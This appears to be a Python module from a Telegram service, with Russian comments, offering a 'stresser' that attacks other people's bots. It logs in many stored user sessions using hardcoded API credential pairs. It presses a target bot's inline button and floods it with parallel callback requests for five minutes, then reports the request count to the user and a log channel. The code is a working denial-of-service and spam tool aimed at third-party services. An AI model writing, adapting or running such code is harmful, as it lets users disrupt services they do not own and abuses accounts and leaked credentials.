"""
Brown V2 | bot_stress.py
Стрессер ботов через спам GetBotCallbackAnswerRequest (нажатие inline кнопок).
Флоу:
  1. Одна сессия шлёт /start → парсим inline кнопки из ответа
  2. Если кнопок нет → ошибка, отмена
  3. Все сессии 5 минут одновременно спамят callback на найденную кнопку
"""

import asyncio
import os
import random
import time
from datetime import datetime

from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest, SendMessageRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback

import config
from config import bot_logs
import keyboards

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
    '29840977:e20b6a9fd01cc9055de0a88a183a030b',
    '29412963:3e37e1d05422db9426aa85e617b441ea',
    '23140129:431e5e839aecf4abdce22d7663acffa7',
]

STRESS_DURATION = 5 * 60  # 5 минут в секундах

bot = None
session_folder = 'sessions'
os.makedirs(session_folder, exist_ok=True)
sessions = [f.replace('.session', '') for f in os.listdir(session_folder) if f.endswith('.session')]


def set_bot_stress(b):
    global bot
    bot = b


def _get_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':')
    return TelegramClient(
        f"./sessions/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


async def find_inline_button(bot_username: str) -> tuple[int | None, bytes | None]:
    """
    Одна сессия шлёт /start боту и ищет первую inline кнопку с callback_data.
    Возвращает (message_id, button_data) или (None, None) если кнопок нет.
    """
    if not sessions:
        return None, None

    session = sessions[0]
    client = _get_client(session)
    try:
        await asyncio.wait_for(client.connect(), timeout=8)
        if not await client.is_user_authorized():
            print(f"[STRESS] Сессия {session} невалидна, пробуем следующую...", flush=True)
            await client.disconnect()
            # Пробуем другую сессию
            for s in sessions[1:]:
                c2 = _get_client(s)
                await asyncio.wait_for(c2.connect(), timeout=8)
                if await c2.is_user_authorized():
                    client = c2
                    session = s
                    break
                await c2.disconnect()
            else:
                return None, None

        peer = await client.get_entity(bot_username)

        # Шлём /start
        sent = await client(SendMessageRequest(
            peer=peer, message='/start',
            random_id=random.randint(1, 2**31)
        ))
        await asyncio.sleep(2)  # ждём ответ бота

        # Получаем последние сообщения от бота
        messages = await client.get_messages(peer, limit=5)
        for msg in messages:
            if msg.reply_markup and isinstance(msg.reply_markup, ReplyInlineMarkup):
                for row in msg.reply_markup.rows:
                    for btn in row.buttons:
                        if isinstance(btn, KeyboardButtonCallback):
                            print(f"[STRESS] Найдена кнопка: '{btn.text}' data={btn.data!r}", flush=True)
                            return msg.id, btn.data

        return None, None

    except Exception as e:
        print(f"[STRESS] Ошибка поиска кнопок: {e}", flush=True)
        return None, None
    finally:
        if client.is_connected():
            await client.disconnect()


async def _spam_callback_session(session: str, bot_username: str, msg_id: int, btn_data: bytes, stop_event: asyncio.Event):
    """Одна сессия: 5 параллельных callback без задержки — безопасно для сессий."""
    client = _get_client(session)
    count = 0
    errors = 0
    try:
        await asyncio.wait_for(client.connect(), timeout=8)
        if not await client.is_user_authorized():
            print(f"[STRESS] [{session}] ❌ НЕВАЛИД", flush=True)
            return 0

        await client.start()
        peer = await client.get_entity(bot_username)
        print(f"[STRESS] [{session}] ✅ Старт callback-спама...", flush=True)

        async def fire_callback():
            nonlocal count, errors
            try:
                await client(GetBotCallbackAnswerRequest(
                    peer=peer, msg_id=msg_id, data=btn_data
                ))
                count += 1
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception as e:
                errors += 1
                if errors <= 3:
                    print(f"[STRESS] [{session}] ⚠️ #{errors}: {str(e)[:50]}", flush=True)

        while not stop_event.is_set():
            tasks = [asyncio.create_task(fire_callback()) for _ in range(5)]
            await asyncio.gather(*tasks, return_exceptions=True)
            if count % 50 == 0 and count > 0:
                print(f"[STRESS] [{session}] 📥 {count} callback", flush=True)

    except Exception as e:
        print(f"[STRESS] [{session}] ❌ КРИТИЧЕСКАЯ: {str(e)[:60]}", flush=True)
    finally:
        if client.is_connected():
            await client.disconnect()

    print(f"[STRESS] [{session}] 🏁 {count} callback | {errors} ошибок", flush=True)
    return count


async def main_bot_stress(bot_username: str, user_id: int, username: str, is_admin: bool):
    """Главная функция стрессера."""
    print(f"\n{'='*50}", flush=True)
    print(f"[STRESS] 🚀 Стрессер запущен", flush=True)
    print(f"[STRESS] 🎯 Цель: {bot_username}", flush=True)
    print(f"[STRESS] 👤 Пользователь: {user_id} (@{username})", flush=True)
    print(f"{'='*50}", flush=True)

    # Шаг 1: найти inline кнопку
    print(f"[STRESS] 🔍 Ищем inline кнопки...", flush=True)
    msg_id, btn_data = await find_inline_button(bot_username)

    if not msg_id or not btn_data:
        print(f"[STRESS] ❌ Inline кнопки не найдены", flush=True)
        from aiogram import types as aiogram_types
        await bot.send_message(
            user_id,
            "❌ *У этого бота нет inline кнопок!*\n*Стрессер работает только с ботами у которых есть кнопки.*",
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu
        )
        return False  # сигнал — КД не ставить

    print(f"[STRESS] ✅ Кнопка найдена, запускаем атаку на {STRESS_DURATION//60} минут...", flush=True)
    print(f"[STRESS] 📦 Сессий: {len(sessions)} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
    await bot.send_message(
        user_id,
        f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*",
        parse_mode="Markdown"
    )

    # Шаг 2: запускаем все сессии одновременно
    stop_event = asyncio.Event()

    # Останавливаем через STRESS_DURATION секунд
    async def stop_after():
        await asyncio.sleep(STRESS_DURATION)
        stop_event.set()

    asyncio.create_task(stop_after())

    tasks = [
        _spam_callback_session(s, bot_username, msg_id, btn_data, stop_event)
        for s in sessions
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    total = sum(r for r in results if isinstance(r, int))
    print(f"\n[STRESS] {'='*50}", flush=True)
    print(f"[STRESS] 🏁 Итог: {total} callback запросов отправлено", flush=True)
    print(f"[STRESS] {'='*50}\n", flush=True)

    from aiogram import types as aiogram_types
    await bot.send_document(
        bot_logs,
        None,
        caption=(
            f"⚡️ *Стрессер завершён*\n"
            f"*└─ Цель: {bot_username}*\n"
            f"*└─ Callback запросов: {total}*\n"
            f"*└─ Пользователь: {user_id} (@{username})*"
        ),
        parse_mode="Markdown"
    )
    await bot.send_message(
        user_id,
        f"✅ *Стрессер завершён!*\n*└─ Отправлено {total} запросов за 5 минут*",
        parse_mode="Markdown",
        reply_markup=keyboards.main_menu
    )
    return True  # КД ставить
